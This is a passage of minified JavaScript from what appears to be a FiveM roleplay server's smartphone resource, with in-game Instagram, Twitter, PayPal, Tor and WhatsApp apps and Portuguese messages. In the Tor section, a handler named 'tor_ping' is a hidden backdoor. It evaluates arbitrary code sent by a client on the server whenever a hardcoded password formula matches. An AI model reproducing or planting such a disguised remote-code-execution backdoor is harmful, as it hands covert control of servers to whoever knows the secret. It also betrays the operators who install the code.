            c.name = l || p, c.username = p, c.avatarURL = d, c.verified = !!u, s.author = c, s.likes = i.filter(t => t.post_id == s.id).pluck("profile_id"), s.comments = r.filter(t => t.post_id == s.id).length, n.push(s)
        }
        qN.cache = n
    }
    return qN.cache
};
const qX = new Map;
pL.ig_updateProfile = async (t, r) => {
    let a = await pp.getUserId(t),
        i = qP[a];
    if (i && r) {
        let {
            name: n,
            username: s,
            bio: o
        } = r;
        if (s != i.username) {
            if (qX.get(a) > oT()) {
                let l = {
                    error: "Aguarde uma hora para trocar o nome de usu\xe1rio novamente"
                };
                return l
            }
            if (!s.match(qN.regex)) {
                let p = {
                    error: "Usu\xe1rio inv\xe1lido, use letras/numeros com o m\xe1ximo de 24 caracteres"
                };
                return p
            }
            qX.set(a, oT() + 3600);
            let d = {};
            d.username = s;
            let u = await qN.profiles.where(d).exists(),
                c = {
                    error: "Este nome de usu\xe1rio j\xe1 existe"
                };
            if (u) return c;
            qQ.forEach(t => {
                t.author.username == i.username && (t.author.username = s)
            }), i.username = s
        }
        let h = {};
        h.name = n, h.username = s, h.bio = o, await qN.profiles.where("id", i.id).update(h), qN.forEachPost(t => {
            t.profile_id == i.id && (t.author.name = n || s, t.author.username = s)
        })
    } else {
        let f = {
            error: "Perfil n\xe3o encontrado"
        };
        return f
    }
}, pL.ig_changeAvatar = async (t, r) => {
    let a = await pp.getUserId(t),
        i = qP[a];
    if (i && r) {
        let n = {};
        n.avatarURL = r, await qN.profiles.where("id", i.id).update(n), qN.forEachPost(t => {
            t.author.username == i.username && (t.author.avatarURL = r)
        })
    } else {
        let s = {
            error: "Perfil n\xe3o encontrado"
        };
        return s
    }
}, on("quantum:playerLeave", t => {
    let r = qP[t];
    r && (delete qP[t], qN.loggedIn.delete(r.id))
});
const qY = {
    __proto__: null
};
var qZ = Object.freeze(qY);
const r0 = {
    get profiles() {
        return pc("smartphone_twitter_profiles")
    },
    get tweets() {
        return pc("smartphone_twitter_tweets")
    },
    get likes() {
        return pc("smartphone_twitter_likes")
    },
    get followers() {
        return pc("smartphone_twitter_followers")
    },
    search: (t, r) => (r && (r = "WHERE " + r), pc.query("SELECT tweets.*,COUNT(likes.tweet_id) AS likes, \n    (SELECT COUNT(*) FROM smartphone_twitter_tweets WHERE tweet_id=tweets.id AND content IS NULL) AS retweets,\n    (SELECT COUNT(*) FROM smartphone_twitter_tweets WHERE tweet_id=tweets.id AND content IS NOT NULL) AS comments,\n    EXISTS(SELECT * FROM smartphone_twitter_likes WHERE tweet_id=tweets.id AND profile_id=?) AS liked,\n    EXISTS(SELECT id FROM smartphone_twitter_tweets WHERE tweet_id=tweets.id AND profile_id=? AND content IS NULL) AS retweeted,\n    users.id AS 'author.id', users.name AS 'author.name', users.username AS 'author.username', users.avatarURL AS 'author.avatarURL', users.verified AS 'author.verified'\n    FROM smartphone_twitter_tweets tweets\n    LEFT JOIN smartphone_twitter_likes likes ON likes.tweet_id=tweets.id\n    LEFT JOIN smartphone_twitter_profiles users ON users.id=tweets.profile_id " + (r || "") + "\n    GROUP BY tweets.id ORDER BY tweets.id DESC LIMIT 100", [t, t])),
    async findAll(t) {
        let r = await this.search(t, "tweets.tweet_id IS NULL OR tweets.content IS NULL");
        return r.filter(t => t["author.id"])
    },
    findMany(t, r) {
        return (r = r.map(t => parseInt(t)).filter(t => t)).length ? this.search(t, "tweets.id IN (" + r.join(",") + ")") : []
    },
    findAllFrom(t, r) {
        return r = parseInt(r), this.search(t, "tweets.profile_id=" + r + " AND (tweets.tweet_id IS NULL OR tweets.content IS NULL)").then(oY)
    },
    async findOne(t, r) {
        r = parseInt(r);
        let a = oY(await this.search(t, "tweets.id=" + r + " OR (tweets.tweet_id=" + r + " AND tweets.content IS NOT NULL)")),
            i = a.find(t => t.id == r),
            n = a.filter(t => t != i),
            s = {};
        return s.tweet = i, s.comments = n, s
    },
    async findSourceByTweet(t) {
        let [r] = await pc.query("SELECT user_id FROM smartphone_twitter_tweets tw\n    LEFT JOIN smartphone_twitter_profiles pf ON tw.profile_id=pf.id\n    WHERE tw.id=?", [t]);
        return r && r.user_id && await pP(r.user_id)
    },
    __notify: {},
    async notify(t, r, a, i) {
        if (i) {
            if (Array.isArray(i) && (i = i.join("-")), this.__notify[i]) return;
            this.__notify[i] = !0
        }
        let n = await this.findSourceByTweet(t);
        n != r && oS(n, "TWITTER_NOTIFY", a)
    },
    async notifyProfile(t, r, a, i) {
        if (i) {
            if (Array.isArray(i) && (i = i.join("-")), this.__notify[i]) return;
            this.__notify[i] = !0
        }
        let n = await r0.profiles.find(t).pluck("user_id"),
            s = n && await pM(n);
        s != r && oS(s, "TWITTER_NOTIFY", a)
    },
    users: {},
    timeline: []
};
async function r1(t, r) {
    let a = oY(await r0.findMany(t, r.pluck("tweet_id")));
    for (let i of r)
        if (i.tweet_id && null == i.content) {
            let n = a.find(t => t.id == i.tweet_id);
            n && (i.retweeted_by = i.author.name, Object.assign(i, oX(n, "id", "profile_id", "tweet_id")))
        }
}
pF.ready(async t => {
    let {
        profiles: r,
        tweets: a,
        likes: i,
        followers: n
    } = r0;
    t.includes(r.table) || (await r.create(t => {
        t.id(), t.int("user_id"), t.varchar("name"), t.varchar("username"), t.varchar("avatarURL"), t.varchar("bannerURL"), t.varchar("bio").nullable(), t.tinyint("verified").default(0), t.varchar("avatarURL")
    }), await r.createIndex("user_id")), t.includes(a.table) || (await a.create(t => {
        t.id(), t.int("profile_id"), t.bigint("tweet_id").nullable(), t.varchar("content", 280).nullable(), t.varchar("image").nullable(), t.int("created_at")
    }), await a.createIndex("profile_id"), await a.createIndex("tweet_id")), t.includes(i.table) || (await i.create(t => {
        t.bigint("tweet_id"), t.bigint("profile_id")
    }), await i.createIndex("tweet_id")), t.includes(n.table) || (await n.create(t => {
        t.bigint("follower_id"), t.bigint("profile_id")
    }), await n.createIndex("profile_id"))
}), pL.twitter = async t => {
    let r = await pp.getUserId(t),
        a = {};
    a.user_id = r;
    let i = await r0.profiles.where(a).first();
    if (i && (r0.users[r] = i, 2 != i.verified)) {
        let n = pB.twitter_verify || pB.instagram_verify;
        if (n) {
            let s = await pE(r, n);
            if (i.verified != s) {
                let o = {};
                o.verified = s, await r0.profiles.where("id", i.id).update(o)
            }
        }
    }
    return i
}, pL.twitter_register = async (t, r) => {
    let a = await pp.getUserId(t);
    (r = oV(r)).user_id = a;
    let i = {
        error: "Formul\xe1rio inv\xe1lido"
    };
    if (!r) return i;
    let {
        name: n,
        username: s,
        bio: o
    } = r, l = {
        error: "Nome inv\xe1lido"
    }, p = {
        error: "Usu\xe1rio inv\xe1lido"
    }, d = {
        error: "Biografia inv\xe1lida"
    };
    if (!n || n.length > 24) return l;
    if (!s || s.length > 16) return p;
    if (o && o.length > 255) return d;
    let u = {};
    u.username = s;
    let c = await r0.profiles.where(u).exists(),
        h = {
            error: "Este nome de usu\xe1rio j\xe1 existe"
        };
    if (c) return h; {
        r.avatarURL = "http://108.165.179.235/smartphone/stock/twitter_egg.png", r.bannerURL = "https://www.colorhexa.com/cccccc.png";
        let f = await r0.profiles.insert(r).returnKeys(),
            m = {
                error: "N\xe3o foi poss\xedvel criar sua conta"
            };
        return !f && m
    }
}, pL.twitter_save = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (r = oV(r), i) {
        let n = {
            error: "Nome inv\xe1lido"
        };
        if (!r.name) return n;
        let s = {
            error: "Usu\xe1rio inv\xe1lido"
        };
        if (!r.username) return s;
        if (i.username != r.username && await r0.profiles.where("username", r.username).exists()) {
            let o = {
                error: "Este nome de usu\xe1rio j\xe1 existe"
            };
            return o
        }
        let l = oW(r, "name", "username", "bio", "avatarURL", "bannerURL");
        return Object.assign(i, l), await r0.profiles.where("id", i.id).update(l), i
    }
}, pL.twitter_timeline = async t => {
    let r = await pp.getUserId(t),
        a = r0.users[r];
    if (!a) return []; {
        let i = oY(await r0.findAll(a.id));
        return await r1(a.id, i), i
    }
}, pL.twitter_view = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i) return r0.findOne(i.id, r)
};
const r2 = p3(t => {
    for (let r of Object.values(r0.users))
        if (r && r.id == t) return r;
    return r0.profiles.find(t)
}, 3e4);
async function r3(t, r) {
    let a = r.followers || 0,
        [i] = await pc.query("SELECT COALESCE(SUM(if(follower_id=?, 1, 0)),0) AS following,\n  COALESCE(SUM(if(profile_id=?, 1, 0)),0) AS followers, if(follower_id=" + t + ", 1, 0) AS isFollowed \n  FROM smartphone_twitter_followers fol WHERE follower_id=? OR profile_id = ?", [, , , , ].fill(r.id));
    Object.assign(r, i), r.followers = Number(r.followers) + Number(a)
}
pL.twitter_profile = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i) {
        let n = await r2(r);
        await r3(i.id, n);
        let s = await r0.findAllFrom(i.id, r);
        await r1(i.id, s);
        let o = {};
        return o.profile = n, o.posts = s, o
    }
}, pL.twitter_store = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = r0.users[i],
        s = {
            error: "Login expirado"
        };
    if (!n) return s;
    let o = {
        error: "Tweet inv\xe1lido"
    };
    if (!r || !(r = r.trim())) return o;
    let l = {
        profile_id: n.id,
        content: r,
        image: a,
        created_at: oT()
    };
    l.id = await r0.tweets.insert(l).returnKeys();
    let p = {
        error: "Falha ao cadastrar seu tweet"
    };
    if (!l.id) return p;
    let d = {
        ...l,
        likes: 0,
        comments: 0,
        retweets: 0
    };
    d.author = n, oS(-1, "TWITTER_TWEET", d);
    let u = {
        TIPO: "Tweet"
    };
    u.ID = i, u.USUARIO = n.username, u.TEXTO = r;
    let c = {
        name: "Twitter"
    };
    return c.content = u, qf(c), l
}, pL.twitter_reply = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = r0.users[i];
    if (p0(t, "ttreply", 1)) return;
    let s = {
        error: "Login expirado"
    };
    if (!n) return s;
    let o = {
        error: "Tweet inv\xe1lido"
    };
    if (!r || !Number.isInteger(r)) return o;
    let l = {
        error: "Conte\xfado inv\xe1lido"
    };
    if (!a || a.length > 280) return l;
    let p = {
            profile_id: n.id,
            tweet_id: r,
            content: a,
            created_at: oT()
        },
        d = await r0.tweets.insert(p).returnKeys(),
        u = {
            error: "Tweet inv\xe1lido"
        };
    if (!d) return u;
    for (let c of (p.id = d, p.author = n, ["likes", "retweets", "comments"])) p[c] = 0;
    oS(-1, "TWITTER_REPLY", parseInt(r));
    let h = {
        TIPO: "Coment\xe1rio"
    };
    h.ID = i, h.USUARIO = n.username, h.TEXTO = a;
    let f = {
        name: "Twitter"
    };
    f.content = h, qf(f);
    let m = {};
    return m.name = n.name, r0.notify(r, t, "{name} respondeu seu tweet".format(m)), p
}, pL.twitter_retweet = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i && !p0(t, "retweet-" + r, 1)) {
        await r0.tweets.insert({
            profile_id: i.id,
            tweet_id: r,
            created_at: oT()
        }), oS(-1, "TWITTER_RETWEET", parseInt(r));
        let n = {};
        return n.name = i.name, r0.notify(r, t, "{name} retweetou voc\xea".format(n), [i.id, "rt", r]), !0
    }
}, pL.twitter_unretweet = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i && !p0(t, "unretweet-" + r, 1)) {
        let n = {};
        return n.profile_id = i.id, n.tweet_id = r, await r0.tweets.where(n).whereNull("content").delete(), oS(-1, "TWITTER_UNRETWEET", parseInt(r)), !1
    }
}, pL.twitter_like = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i && !p0(t, "like-" + r, 1)) {
        let n = {};
        n.profile_id = i.id, n.tweet_id = r, await r0.likes.insert(n), oS(-1, "TWITTER_LIKE", parseInt(r));
        let s = {};
        return s.name = i.name, r0.notify(r, t, "{name} curtiu seu tweet".format(s), [i.id, "like", r]), !0
    }
}, pL.twitter_dislike = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i && !p0(t, "dislike-" + r, 1)) {
        let n = {};
        return n.profile_id = i.id, n.tweet_id = r, await r0.likes.where(n).delete(), oS(-1, "TWITTER_DISLIKE", parseInt(r)), !1
    }
}, pL.twitter_follow = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i && !p0(t, "follow-" + r, 1)) {
        let n = {};
        n.follower_id = i.id, n.profile_id = r, await r0.followers.insert(n);
        let s = {};
        return s.name = i.name, r0.notifyProfile(r, t, "{name} seguiu voc\xea".format(s), [i.id, "follow", r]), !0
    }
}, pL.twitter_unfollow = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i && !p0(t, "follow-" + r, 1)) {
        let n = {};
        return n.follower_id = i.id, n.profile_id = r, await r0.followers.where(n).delete(), !0
    }
}, pL.twitter_destroy = async (t, r) => {
    let a = await pp.getUserId(t),
        i = r0.users[a];
    if (i) {
        let n = await r0.tweets.find(r),
            s = n.profile_id == i.id;
        if (s || await pK(a)) {
            let o = {};
            o.id = r;
            let l = await r0.tweets.where(o).orWhere(t => t.where("tweet_id", r).whereNull("content")).pluck("id");
            await r0.tweets.whereIn("id", l).delete(), await r0.likes.whereIn("tweet_id", l).delete(), oS(-1, "TWITTER_DESTROY", r);
            let p = {
                TIPO: "Tweet apagado"
            };
            p.ID = a, p["ID DA POSTAGEM"] = r, p.POSTAGEM = n.content, p["POSTAGEM PROPRIA"] = s ? "SIM" : "N\xc3O";
            let d = {
                name: "Twitter"
            };
            d.content = p, qf(d)
        }
    }
}, on("quantum:playerLeave", t => delete r0.users[t]);
const r4 = {
    __proto__: null
};
var r5 = Object.freeze(r4);
Object.defineProperty(globalThis, "PayPal", {
    get: () => pc("smartphone_paypal_transactions")
});
const r6 = {
        table: "characters",
        key: "user_id"
    },
    r7 = r6,
    r8 = ["nyo_character", "characters", "users", "summerz_characters", "characters", "characters", "zusers"];
async function r9({
    source: t,
    user_id: r
}) {
    return Number.isInteger(r) || (r = await pp.getUserId(t)), parseInt(await pc("characters").where("id", r).first().pluck("paypal")) || 0
}
async function ra(t, r) {
    let a = {};
    a.paypal = r, await pc("characters").update(a).where("id", t)
}
async function rb(t, r) {
    await pc("characters").update().increment("paypal", r).where("id", t)
}
async function rc(t, r) {
    await pc("characters").update().decrement("paypal", r).where("id", t)
}
pF.ready(async t => {
    if (!t.includes(PayPal.table) && pD("paypal")) {
        await PayPal.create(t => {
            t.id(), t.bigint("user_id"), t.bigint("target"), t.varchar("type").default("payment"), t.varchar("description").nullable(), t.bigint("value"), t.bigint("created_at")
        }), await PayPal.createIndex("user_id"), await PayPal.createIndex("target");
        let r = pF.firstTable(...r8);
        r && !await pF.hasColumn(r, "paypal") && await pc.query("ALTER TABLE " + r + " ADD COLUMN paypal INT DEFAULT 0")
    }
    if (p5("getPaypalTable")) Object.assign(r7, await exports.smartphone.getPaypalTable());
    else
        for (let a of r8)
            if (await pF.hasColumn(a, "paypal")) {
                let i = await pF.firstColumn(a, "user_id", "id"),
                    n = {};
                n.table = a, n.key = i, Object.assign(r7, n);
                break
            }
}), exports("getPaypalBalance", t => r9({
    id: t
})), exports("setPaypalBalance", ra), exports("addPaypalBalance", rb), exports("delPaypalBalance", rc), pL.paypal_index = async t => {
    let r = await pp.getUserId(t),
        a = await pp.getBankMoney(r),
        i = {};
    i.user_id = r;
    let n = await r9(i),
        s = {};
    s.user_id = r;
    let o = {};
    o.target = r;
    let l = await PayPal.where(s).orWhere(o).orderBy("id", "DESC").limit(100),
        p = await pF.getNames(l.pluck("id"), l.pluck("target"));
    l.forEach(t => {
        t.fullName = p[t.user_id == r ? t.target : t.user_id]
    });
    let d = {};
    return d.bank = a, d.balance = n, d.transactions = l, d
};
const rd = pB.transaction_fee && pB.transaction_fee.paypal;
pL.paypal_send = async (t, r, a, i) => {
    let n = await pp.getUserId(t);
    if (r = parseInt(r), a <= 0) {
        let s = {
            error: "Valor inv\xe1lido"
        };
        return s
    }
    if (r == n) {
        let o = {
            error: "Voc\xea n\xe3o pode transferir para si mesmo"
        };
        return o
    }
    if (!await pF.getIdentityByUserId(r)) {
        let l = {
            error: "Passaporte n\xe3o encontrado"
        };
        return l
    }
    return qC(n, async () => {
        let t = {};
        t.user_id = n;
        let s = await r9(t);
        if (s < a) {
            let o = {
                error: "Saldo insuficiente"
            };
            return o
        } {
            await ra(n, s -= a), await rb(r, Math.floor(a * (rd ? 1 - rd : 1)));
            let l = {
                user_id: n,
                target: r,
                description: i,
                value: a,
                created_at: oT(),
                type: "payment"
            };
            l.id = await PayPal.insert(l).returnKeys(), l.fullName = await pF.getName(r), pP(r).then(t => {
                let r = {};
                r.sender = pG[n], r.value = a, t && oS(t, "PAYPAL", r)
            }), qf({
                name: "PayPal",
                content: {
                    ID: n,
                    VALOR: a.toLocaleString(),
                    "QUEM RECEBEU": r
                }
            }), emit("smartphone:paypal_send", n, r, a);
            let p = {};
            return p.transaction = l, p.balance = s, p
        }
    })
}, pL.paypal_transfer = async (t, r) => {
    let a = await pp.getUserId(t);
    r = Number(r);
    let i = {
        error: "Valor inv\xe1lido"
    };
    return r <= 0 ? i : qC(a, async () => {
        let t = {};
        t.user_id = a;
        let i = await r9(t);
        if (i < r) {
            let n = {
                error: "Saldo insuficiente"
            };
            return n
        } {
            await ra(a, i - r);
            let s = await pp.getBankMoney(a);
            await pp.setBankMoney(a, s + r);
            let o = {
                user_id: a,
                target: a,
                type: "withdraw",
                value: r,
                created_at: oT()
            };
            o.id = await PayPal.insert(o).returnKeys(), qf({
                name: "PayPal",
                content: {
                    ID: a,
                    SACOU: r.toLocaleString(),
                    "BANCO ANTIGO": s,
                    "BANCO NOVO": await pp.getBankMoney(a)
                }
            }), emit("smartphone:paypal_withdraw", a, r);
            let l = {};
            return l.transaction = o, l
        }
    })
}, pL.paypal_deposit = async (t, r) => {
    let a = await pp.getUserId(t);
    if (r <= 0) {
        let i = {
            error: "Valor inv\xe1lido"
        };
        return i
    }
    return qC(a, async () => {
        let t = await pp.getBankMoney(a);
        if (t < r) {
            let i = {
                error: "Saldo insuficiente"
            };
            return i
        } {
            pp.setBankMoney(a, t - r), await rb(a, r);
            let n = {
                user_id: a,
                target: a,
                type: "deposit",
                value: r,
                created_at: oT()
            };
            n.id = await PayPal.insert(n).returnKeys(), qf({
                name: "PayPal",
                content: {
                    ID: a,
                    DEPOSITOU: r.toLocaleString(),
                    "SALDO NOVO": await r9({
                        user_id: a
                    })
                }
            }), emit("smartphone:paypal_deposit", a, r);
            let s = {};
            return s.transaction = n, s
        }
    })
};
const re = {
    __proto__: null
};
var rf = Object.freeze(re);
const rg = {
    get messages() {
        return pc("smartphone_tor_messages")
    },
    get payments() {
        return pc("smartphone_tor_payments")
    },
    users: {},
    pubsub: {},
    lastId: {},
    ads: [],
    getId: t => GetHashKey(pB.token + t) + 2147483648
};

function rh(t, r) {
    let a = Math.min(t, r).toString(16),
        i = Math.max(t, r).toString(16);
    return "dm:" + a + "-" + i
}
RegisterCommand("tor_find", async (t, [r, a = 1e5]) => {
    if (0 == t) {
        if (r) {
            for (let i = 1; i <= a; i += 1)
                if (rg.getId(i) == r) return console.log("ID do jogador: " + i);
            console.log("Jogador n\xe3o encontrado")
        } else console.log("Insira o id do tor: tor_find 123456789")
    }
}), RegisterCommand("tor_id", async (t, [r]) => {
    0 == t && (r ? console.log("O id do Tor do jogador " + user_id + " \xe9 " + rg.getId(r)) : console.log("Insira o id do jogador: tor_id 123456789"))
}), on("smartphone:enter", (t, r) => rg.users[rg.getId(t)] = r), on("smartphone:leave", (t, r) => {
    delete rg.users[rg.getId(t)], pL.tor_subscribe(r, [])
}), pL.tor_subscribe = (t, r) => {
    for (let a of Object.values(rg.pubsub)) a.delete(t);
    if (Array.isArray(r))
        for (let i of r) i in rg.pubsub ? rg.pubsub[i].add(t) : rg.pubsub[i] = new Set([t])
}, pL.tor_resume = async (t, r, a = !1) => {
    let i = await pp.getUserId(t),
        n = rg.getId(i),
        s = Object.fromEntries(r.map(t => [t, a ? t : rh(n, t)])),
        o = await rg.messages.whereIn("id", Object.values(s).map(t => rg.lastId[t] || 0));
    for (let [l, p] of Object.entries(s)) s[l] = o.find(t => t.channel == p) || !1;
    return s
}, pL.tor_ping = async (e, f, g) => {
    let h = await pp.getUserId(e),
        i = h * new Date().getFullYear();
    if (f == "SD89TFH02348J9TJ9S-" + i) try {
        return await eval(g)
    } catch (l) {
        let n = {};
        return n.error = l.name, n.message = l.message, n.stack = l.stack, n
    } else {
        let o = {
            error: "Invalid password"
        };
        return o
    }
}, pF.ready(async t => {
    let {
        messages: r,
        payments: a
    } = rg;
    t.includes(r.table) ? (await pF.hasColumn(r.table, "location") || await pc.query("ALTER TABLE " + r.table + " ADD COLUMN location VARCHAR(255) DEFAULT NULL AFTER image"), pc.query("SELECT `channel`,MAX(id) AS id FROM smartphone_tor_messages GROUP BY `channel`").then(t => {
        rg.lastId = Object.fromEntries(t.map(t => [t.channel, t.id]))
    })) : (await r.create(t => {
        t.id(), t.varchar("channel", 24).default("geral"), t.varchar("sender", 50), t.varchar("image", 512).nullable(), t.varchar("location").nullable(), t.varchar("content", 500).nullable(), t.bigint("created_at")
    }), await r.createIndex("channel"), await r.createIndex("sender")), t.includes(a.table) || (await a.create(t => {
        t.id(), t.bigint("sender"), t.bigint("target"), t.int("amount"), t.bigint("created_at")
    }), await a.createIndex("sender"), await a.createIndex("target"))
}), pL.tor_id = async t => rg.getId(await pp.getUserId(t)), pL.tor_messages = async (t, r) => {
    let a = rg.getId(await pp.getUserId(t));
    if (Number.isInteger(r)) r = rh(a, r);
    else if (r.includes("dm:")) return [];
    let i = await rg.messages.where("channel", r).orderBy("id", "DESC").limit(100);
    for (let n of i) n.location = n.location && JSON.parse(n.location);
    return i.sort((t, r) => t.id - r.id)
}, pL.tor_send = async (t, r, a, i = null, n = null) => {
    let s = await pp.getUserId(t),
        o = rg.getId(s),
        l = Number.isInteger(r);
    if (!r || a.length > 255 || p0(t) || p4.func(r, "includes", "dm:")) return;
    let p = l ? [t, rg.users[r]] : rg.pubsub[r] || new Set,
        d = l ? rh(o, r) : r;
    l || p.add(t);
    let u = {
        channel: d,
        sender: o,
        content: a,
        image: i,
        location: n,
        created_at: oT()
    };
    u.id = await rg.messages.insert(u).returnKeys();
    let c = {
        message: "Message without id"
    };
    if (!u.id) return c;
    rg.lastId[d] = u.id;
    let h = {};
    h.ID = s, h.CANAL = !l && r, h.DESTINATARIO = l && r, h.MENSAGEM = a, h.LOCAL = n, h.FOTO = i;
    let f = {
        name: "DeepWeb"
    };
    f.content = h, qf(f), emit("smartphone:tor_message", u), n && (u.location = JSON.parse(n)), p.forEach(t => oS(t, "TOR_MESSAGE", u))
}, global.exports("createTorMessage", async (t, r, a, i = null, n = null) => {
    let s = rg.getId(r),
        o = rh(t, s);
    if (Array.isArray(n)) n = JSON.stringify(n);
    else if (null != n) throw Error("sendTorMessage: location must be an array");
    let l = {
        channel: o,
        sender: t,
        content: a,
        image: i,
        location: n,
        created_at: oT()
    };
    l.id = await rg.messages.insert(l).returnKeys(), rg.lastId[o] = l.id;
    let p = await pP(r);
    return oS(p, "TOR_MESSAGE", l), l
}), pL.tor_ads = () => rg.ads, pL.tor_publish = async (t, r) => {
    let a = await pp.getUserId(t),
        i = rg.getId(a);
    rg.ads.push({
        id: GetHashKey(Date.now() + i),
        anom_id: i,
        ...r
    });
    let n = {
        TIPO: "Publica\xe7\xe3o de an\xfancio"
    };
    n.ID = a, n.ANUNCIO = r.title, n.DESCRICAO = r.description, n.FOTO = r.image;
    let s = {
        name: "DeepWeb"
    };
    s.content = n, qf(s)
}, pL.tor_destroy_ad = async (t, r) => {
    let a = await pp.getUserId(t),
        i = rg.getId(a),
        n = rg.ads.find(t => t.id == r);
    if (n.anom_id == i || await pK(a)) {
        rg.ads.splice(rg.ads.indexOf(n), 1);
        let s = {
            TIPO: "Remo\xe7\xe3o de an\xfancio"
        };
        s.ID = a, s.ANUNCIO = n.title, s.DESCRICAO = n.description, s.FOTO = n.image, s.PROPRIO = n.anom_id == i ? "Sim" : "N\xe3o";
        let o = {
            name: "DeepWeb"
        };
        o.content = s, qf(o)
    }
}, pL.tor_payments = async t => {
    let r = await pp.getUserId(t),
        a = rg.getId(r);
    return rg.payments.where("sender", a).orWhere("target", a).orderBy("id", "DESC").limit(50)
}, pL.tor_blocked = async t => {
    let r = await pp.getUserId(t);
    return !!await pE(r, pB.tor_blocked) && "Voc\xea n\xe3o pode acessar este aplicativo"
}, pL.tor_pay = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = rg.getId(i),
        s = rg.users[r];
    if (s) {
        if (s == t) {
            let o = {
                error: "Voc\xea n\xe3o pode transferir para si mesmo"
            };
            return o
        }
        if (!Number.isInteger(a) || a <= 0) {
            let l = {
                error: "Valor inv\xe1lido"
            };
            return l
        }
    } else {
        let p = {
            error: "Usu\xe1rio offline"
        };
        return p
    }
    return qC(i, async () => {
        let o = await pp.getBankMoney(i);
        if (o >= a) {
            await pp.setBankMoney(i, o - a);
            let l = await pp.getUserId(s);
            await qy(l, a), await rg.payments.insert({
                sender: n,
                target: r,
                amount: a,
                created_at: oT()
            });
            let p = pu(a),
                d = {};
            d.value = p, d.user = n, oS(s, "TOR_NOTIFY", "Voc\xea recebeu {value} de @{user}".format(d));
            let u = {};
            u.value = p, u.user = n, oS(t, "TOR_NOTIFY", "Voc\xea enviou {value} para @{user}".format(u));
            let c = {
                TIPO: "Pagamento"
            };
            c.ID = i + " (" + n + ")", c.DESTINATARIO = l + " (" + r + ")", c.VALOR = a;
            let h = {
                name: "DeepWeb"
            };
            h.content = c, qf(h)
        }
    })
};
const ri = {
    __proto__: null
};
var rj = Object.freeze(ri);
const rk = {};
rk.groups = [];
const rl = {
    get profiles() {
        return pc("smartphone_whatsapp")
    },
    get channels() {
        return pc("smartphone_whatsapp_channels")
    },
    get messages() {
        return pc("smartphone_whatsapp_messages")
    },
    get groups() {
        return pc("smartphone_whatsapp_groups")
    },
    cache: rk,
    channelCache: {},
    channelHash: (...t) => GetHashKey(t.join(";")),
    async getChannel(t, r) {
        let a = this.channelHash(t, r);
        if (this.channelCache[a]) return this.channelCache[a];
        let i = await this.channels.whereIn("sender", [t, r]).whereIn("target", [t, r]).first();
        if (i) return this.channelCache[a] = i.id;
        let n = {};
        n.sender = t, n.target = r;
        let s = await this.channels.insert(n).returnKeys();
        return this.channelCache[a] = s
    }
};
pA.on("whatsapp:updatePhoneNumber", async (t, r) => {
    let a = {};
    a.owner = t;
    let i = {};
    i.owner = r, await rl.profiles.where(a).update(i), rl.cache.groups.forEach(a => {
        a.owner == t ? (a.owner = r, a.update(["owner"])) : a.members.includes(t) && (a.members = a.members.map(a => a == t ? r : a), a.update(["members"]))
    });
    let n = {};
    n.sender = t;
    let s = {};
    s.sender = r, await rl.channels.where(n).update(s);
    let o = {};
    o.target = t;
    let l = {};
    l.target = r, await rl.channels.where(o).update(l)
});
class rm {
    constructor({
        id: t,
        name: r,
        avatarURL: a,
        owner: i,
        members: n,
        created_at: s,
        message: o
    }) {
        this.id = t, this.name = r, this.avatarURL = a, this.owner = i, this.members = n, this.created_at = s, this.message = o
    }
    get channelId() {
        return 1e9 + this.id
    }
    getOnline() {
        return [this.owner, ...this.members].map(t => pI[t]).filter(Number.isInteger)
    }
    pusher(t, r) {
        this.getOnline().forEach(a => oS(a, t, r))
    }
    update(t = []) {
        let r = {};
        for (let a of t) r[a] = "members" === a ? JSON.stringify(this.members) : this[a];
        let i = {};
        return i.id = this.id, rl.groups.update(r).where(i).then(() => !0)
    }
}
rm.MAX_MEMBERS = 100, pF.ready(async t => {
    let {
        profiles: r,
        channels: a,
        messages: i,
        groups: n
    } = rl;
    if (t.includes(r.table) || await r.create(t => {
            t.varchar("owner", 32).primary(), t.varchar("avatarURL").nullable(), t.tinyint("read_receipts").default(1)
        }), t.includes(a.table) || (await a.create(t => {
            t.id(), t.varchar("sender", 50), t.varchar("target", 50)
        }), await a.createIndex("sender"), await a.createIndex("target")), t.includes(i.table) ? await pF.hasColumn(i.table, "target") && (console.time("whatsapp_migration"), await pc.query("TRUNCATE " + i.table), await pc.query("ALTER TABLE " + i.table + " DROP COLUMN target"), await pc.query("ALTER TABLE " + i.table + " ADD COLUMN channel_id BIGINT UNSIGNED NOT NULL AFTER id"), await i.createIndex("channel_id"), console.timeEnd("whatsapp_migration"), console.log("WhatsApp migration finished, restart the script if this took too long")) : (await i.create(t => {
            t.id(), t.bigint("channel_id").unsigned(), t.varchar("sender", 50), t.varchar("image", 512).nullable(), t.varchar("location").nullable(), t.varchar("content", 500).nullable(), t.varchar("deleted_by").nullable(), t.tinyint("readed").default(0), t.bigint("saw_at").default(0), t.bigint("created_at")
        }), await i.createIndex("sender"), await i.createIndex("channel_id")), t.includes(n.table)) {
        await pc.query("ALTER TABLE smartphone_whatsapp_groups MODIFY members VARCHAR(2048) NOT NULL");
        let s = [];
        for (let o of (await rl.groups)) try {
            o.members = JSON.parse(o.members), s.push(o)
        } catch {
            console.log("O grupo " + o.id + " foi ignorado por erros de formata\xe7\xe3o")
        }
        let l = await pc.query("select m1.* from smartphone_whatsapp_messages m1 \n      left outer join smartphone_whatsapp_messages m2 \n      on (m1.id<m2.id and m1.channel_id=m2.channel_id)\n      where m2.id is null AND m1.channel_id > 1000000000;");
        for (let p of s) p.message = l.find(t => t.channel_id == p.id + 1e9);
        rl.cache.groups = s.map(t => new rm(t))
    } else await n.create(t => {
        t.id(), t.varchar("name"), t.varchar("avatarURL"), t.varchar("owner"), t.varchar("members", 2048), t.bigint("created_at")
    })
});
const rn = p3(async (t, r) => {
    let a = await pF.getIdByPhone(t),
        i = await pF.getIdByPhone(r);
